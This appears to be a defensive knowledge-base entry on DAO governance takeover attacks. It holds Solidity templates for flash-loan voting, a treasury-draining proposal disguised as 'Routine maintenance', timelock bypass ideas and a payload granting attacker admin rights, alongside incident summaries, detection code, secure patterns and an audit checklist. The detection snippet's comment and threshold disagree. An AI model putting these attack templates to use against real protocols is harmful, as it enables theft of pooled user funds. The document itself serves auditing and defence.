---
id: ATTACK-CHAIN-GOVERNANCE
title: Governance Takeover Attack Chain
category: attack-chains
difficulty: advanced
tags: [governance, dao, voting, flash-loan, proposal]
real_exploits: [beanstalk-2022, build-finance-2022, fortress-2022]
typical_loss: $50M-200M
last_updated: 2026-01-31
---

# Governance Takeover Attack Chain

## Overview

This attack chain exploits governance mechanisms to gain control of a protocol and execute malicious proposals. It can involve flash loans for voting power, delegate manipulation, or exploiting proposal timing.

## Attack Flow Diagram

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Accumulate   │ ─▶ │ Submit       │ ─▶ │ Vote with    │ ─▶ │ Execute      │ ─▶ │ Drain        │
│ Voting Power │    │ Proposal     │    │ Majority     │    │ After Delay  │    │ Treasury     │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```

## Prerequisites

- **Governance uses token voting** (not veToken time-locked)
- **Proposal threshold achievable** (or can submit via other means)
- **Voting period is short** OR **flash loans can be used**
- **Timelock is short or bypassable**

## Attack Steps

### Step 1: Accumulate Voting Power

**Option A: Flash Loan Voting Power**
```solidity
// Borrow governance tokens via flash loan
function attack() external {
    // 1. Flash borrow governance tokens
    IFlashLender(lender).flashLoan(
        address(this),
        govToken,
        REQUIRED_VOTES,
        ""
    );
}

function onFlashLoan(...) external {
    // 2. Delegate to self (if snapshot not taken yet)
    IGovToken(govToken).delegate(address(this));
    
    // 3. Vote on malicious proposal
    IGovernor(governor).castVote(proposalId, VOTE_FOR);
    
    // 4. Return tokens
    IERC20(govToken).transfer(lender, amount + fee);
}
```

**Option B: Market Accumulation**
```solidity
// Slowly accumulate tokens over time
// Or buy large amount before snapshot

// Many protocols snapshot voting power at proposal creation
// Buy tokens → Create proposal → Vote → Sell tokens
```

**State Change**: Attacker controls sufficient voting power

### Step 2: Submit Malicious Proposal

```solidity
// Proposal that drains the treasury
function submitMaliciousProposal() external {
    address[] memory targets = new address[](1);
    targets[0] = treasury;
    
    uint256[] memory values = new uint256[](1);
    values[0] = 0;
    
    bytes[] memory calldatas = new bytes[](1);
    calldatas[0] = abi.encodeCall(
        ITreasury.withdrawAll,
        (attackerWallet)
    );
    
    // Submit proposal
    uint256 proposalId = IGovernor(governor).propose(
        targets,
        values,
        calldatas,
        "Routine maintenance"  // Innocent-looking description
    );
}
```

**State Change**: Malicious proposal is active

### Step 3: Pass the Vote

```solidity
function voteForProposal(uint256 proposalId) external {
    // If using flash loan, this happens in same tx as borrow
    // If using accumulated tokens, can vote over voting period
    
    IGovernor(governor).castVote(proposalId, 1);  // 1 = For
    
    // May need to prevent others from voting against
    // - Vote at last moment
    // - Accumulate >50% of voting supply
    // - Exploit quorum requirements
}
```

**State Change**: Proposal passes vote threshold

### Step 4: Wait for Timelock (or Bypass)

```solidity
// Standard: Wait for timelock to expire
// Timelock is the last line of defense

function executeAfterTimelock(uint256 proposalId) external {
    // Wait for timelock...
    require(
        block.timestamp >= proposalEta[proposalId],
        "Timelock not expired"
    );
    
    IGovernor(governor).execute(proposalId);
}
```

**Timelock Bypass Techniques:**
```solidity
// 1. Emergency functions that skip timelock
// 2. Proposals that modify timelock itself
// 3. Proposals that grant emergency role
// 4. Direct calls if executor role is misconfigured
```

### Step 5: Execute and Drain

```solidity
// The proposal executes, running attacker's payload
function maliciousPayload() external onlyGovernance {
    // Drain treasury
    IERC20(usdc).transfer(attacker, IERC20(usdc).balanceOf(treasury));
    
    // Upgrade contracts to attacker-controlled
    IProxy(proxy).upgradeTo(maliciousImplementation);
    
    // Grant attacker permanent access
    IAccessControl(protocol).grantRole(ADMIN_ROLE, attacker);
}
```

**Final State**: Protocol drained/compromised

## Real-World Examples

### Beanstalk (April 2022) - $182M

```
1. Flash borrowed $1B in governance tokens
2. Created proposal to drain treasury (BIP-18)
3. Proposal passed instantly (emergency governance)
4. Executed immediately (no timelock)
5. Drained $182M in various tokens
```

**Key Failure**: Emergency governance had no timelock

### Build Finance (February 2022) - $470K

```
1. Attacker accumulated governance tokens over time
2. Submitted proposal to grant self minting rights
3. Proposal passed (low participation)
4. Minted unlimited tokens, sold for treasury assets
```

**Key Failure**: Low quorum + no timelock

## Detection Points

| Step | Detection Signal | Monitoring |
|------|-----------------|------------|
| 1 | Large token transfers | Whale movement alerts |
| 1 | Flash loan of gov tokens | Flash loan monitoring |
| 2 | Unusual proposal | Proposal content analysis |
| 3 | Concentrated voting | Vote distribution analysis |
| 4 | Timelock queue | Monitor pending executions |

```solidity
// Detection: Voting concentration
function detectConcentration(uint256 proposalId) public view returns (bool) {
    (uint256 forVotes, , ) = IGovernor(governor).proposalVotes(proposalId);
    uint256 totalSupply = IERC20(govToken).totalSupply();
    
    // If single address controls >30% of votes
    address topVoter = getTopVoter(proposalId);
    uint256 topVotes = getVotes(proposalId, topVoter);
    
    return topVotes * 100 / forVotes > 50;  // Top voter has >50% of yes votes
}
```

## Prevention Measures

### At Each Step

| Step | Prevention |
|------|------------|
| Token Accumulation | veTokens (time-locked voting) |
| Proposal Submission | High proposal threshold |
| Voting | Voting delay, snapshot at proposal |
| Timelock | Long timelock (3-7 days) |
| Execution | Multi-sig guardian, emergency pause |

### Secure Governance Pattern

```solidity
contract SecureGovernance {
    uint256 public constant VOTING_DELAY = 2 days;    // Delay before voting starts
    uint256 public constant VOTING_PERIOD = 5 days;   // Voting duration
    uint256 public constant TIMELOCK_DELAY = 3 days;  // Delay before execution
    uint256 public constant QUORUM = 4;               // 4% of supply
    
    // Snapshot voting power at proposal creation
    mapping(uint256 => uint256) public proposalSnapshot;
    
    function propose(...) external returns (uint256) {
        require(
            getVotes(msg.sender, block.number - 1) >= proposalThreshold(),
            "Below threshold"
        );
        
        uint256 proposalId = hashProposal(...);
        proposalSnapshot[proposalId] = block.number;
        
        return proposalId;
    }
    
    function castVote(uint256 proposalId, uint8 support) external {
        // Use voting power from snapshot, not current
        uint256 votes = getVotes(msg.sender, proposalSnapshot[proposalId]);
        _countVote(proposalId, msg.sender, support, votes);
    }
    
    // Guardian can cancel suspicious proposals
    address public guardian;
    
    function cancelProposal(uint256 proposalId) external {
        require(msg.sender == guardian, "Not guardian");
        _cancel(proposalId);
    }
}
```

### veToken Pattern

```solidity
// Vote-escrowed tokens prevent flash loan attacks
contract VeToken {
    struct Lock {
        uint256 amount;
        uint256 unlockTime;  // Up to 4 years
    }
    
    mapping(address => Lock) public locks;
    
    function lock(uint256 amount, uint256 duration) external {
        require(duration >= 1 weeks, "Min 1 week");
        require(duration <= 4 years, "Max 4 years");
        
        // Voting power = amount * timeRemaining / maxTime
        locks[msg.sender] = Lock(amount, block.timestamp + duration);
    }
    
    function votingPower(address account) public view returns (uint256) {
        Lock memory userLock = locks[account];
        if (block.timestamp >= userLock.unlockTime) return 0;
        
        uint256 timeRemaining = userLock.unlockTime - block.timestamp;
        return userLock.amount * timeRemaining / MAX_LOCK_TIME;
    }
}
```

## Audit Checklist

```
[ ] Can governance tokens be flash loaned?
[ ] When is voting power snapshotted?
[ ] What is the voting delay?
[ ] What is the timelock duration?
[ ] Is there a guardian/cancellation mechanism?
[ ] What is the quorum requirement?
[ ] Can timelock be bypassed via emergency functions?
[ ] Are there dangerous functions governance can call?
[ ] Can governance upgrade contracts?
```
